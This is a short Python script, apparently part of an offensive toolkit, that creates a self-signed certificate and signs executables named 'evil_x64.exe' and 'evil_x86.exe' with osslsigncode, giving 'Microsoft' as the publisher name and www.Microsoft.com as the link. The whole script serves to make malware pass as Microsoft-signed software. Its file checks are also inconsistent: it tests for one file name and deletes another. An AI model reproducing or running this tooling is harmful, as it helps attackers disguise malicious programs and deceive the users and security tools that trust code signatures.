#signing

import os, sys

def start():
    print('[!] set password as "toor"')
    os.system("openssl req -x509 -newkey rsa:4096 -keyout output/key.pem -out output/cert.pem -days 365")

    if os.path.exists("output/evil_x64.temp"):
        os.system("rm output/evil_x64.temp")
        start_sixty()
    if os.path.exists("output/evil_x86.exe"):
        os.system("rm output/evil_x86.temp")
        start_thirty()

def start_sixty():
    os.system('osslsigncode sign -certs "output/cert.pem" -pass "toor" -key "output/key.pem" -n "Microsoft" -i "https://www.Microsoft.com" -t "http://timestamp.comodoca.com/authenticode" -in "output/evil_x64.exe" -out "output/signed_x64.exe"')

def start_thirty():
    os.system('osslsigncode sign -certs "output/cert.pem" -pass "toor" -key "output/key.pem" -n "Microsoft" -i "https://www.Microsoft.com" -t "http://timestamp.comodoca.com/authenticode" -in "output/evil_x86.exe" -out "output/signed_x86.exe"')

